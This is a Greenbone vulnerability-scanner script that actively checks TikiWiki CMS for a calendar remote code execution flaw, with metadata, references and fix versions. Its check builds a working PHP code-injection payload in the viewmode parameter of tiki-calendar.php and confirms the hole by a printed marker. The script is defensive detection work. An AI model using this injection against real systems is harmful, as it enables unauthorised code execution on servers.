# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tiki:tikiwiki_cms%2fgroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106105");
  script_version("2025-07-18T05:44:10+0000");
  script_tag(name:"last_modification", value:"2025-07-18 05:44:10 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2016-06-23 12:12:32 +0700 (Thu, 23 Jun 2016)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2025-34113");

  script_name("TikiWiki Calendar RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tikiwiki_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("tiki/wiki/http/detected");

  script_xref(name:"URL", value:"https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki");
  script_xref(name:"URL", value:"https://www.acunetix.com/vulnerabilities/web/tiki-wiki-cms-remote-code-execution-via-calendar-module/");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39965/");

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to a remote code execution
  (RCE) vulnerability");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The calendar feature of Tiki Wiki CMS Groupware doesn't
  correctly check the input for the parameter viewmode which may lead to remote code execution.");

  script_tag(name:"impact", value:"A remote attacker may execute arbitrary code.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware prior to version 6.15, 7.x prior to
  9.11, 10.x prior to 12.5 and 13.x prior to 14.2.");

  script_tag(name:"solution", value:"Update to version 6.15, 9.11, 12.5, 14.2 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) )
  exit( 0 );

version = infos["version"];
dir = infos["location"];

if( version_is_greater_equal( version:version, test_version:"14.2" ) ||
    version_in_range( version:version, test_version:"12.5", test_version2:"12.9" ) ) {
  exit( 99 );
}

vrfy = "VT-RCE-Test-" + rand();
if( dir == "/" )
  dir = "";

url = dir + "/tiki-calendar.php?viewmode=';print(" + vrfy + ");$a='";

if( http_vuln_check( port:port, url:url, pattern:vrfy, check_header:TRUE ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
